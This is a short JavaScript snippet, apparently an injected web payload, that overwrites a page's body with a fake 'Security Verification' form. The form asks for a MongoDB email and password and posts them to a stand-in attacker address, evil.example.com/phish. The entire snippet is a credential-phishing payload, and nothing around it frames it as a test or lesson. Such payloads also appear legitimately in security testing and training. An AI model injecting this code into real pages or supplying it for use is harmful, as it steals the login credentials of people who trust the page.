document.body.innerHTML = `
  <h1 style="color:red;text-align:center;">Security Verification</h1>
  <form action="https://evil.example.com/phish" method="POST" style="text-align:center;">
    <input name="email" placeholder="Enter your MongoDB email" /><br>
    <input name="password" type="password" placeholder="Enter your password" /><br>
    <button type="submit">Verify</button>
  </form>
`;
